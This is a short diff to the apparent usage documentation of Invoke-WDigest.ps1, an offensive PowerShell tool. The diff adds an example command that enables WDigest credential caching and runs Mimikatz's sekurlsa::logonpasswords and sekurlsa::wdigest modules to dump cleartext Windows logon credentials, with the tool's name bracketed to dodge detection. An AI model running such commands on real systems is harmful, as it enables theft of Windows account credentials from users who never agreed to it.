@@ -24,6 +24,9 @@ Get-Help .\Invoke-WDigest.ps1 -full
 #  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
 .\Invoke-WDigest.ps1 -wdigest 'true' -manycats
 
+# Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple Dump::Modules
+.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::logonpasswords exit'
+
 
 [FAST DEMONSTRATION]
 
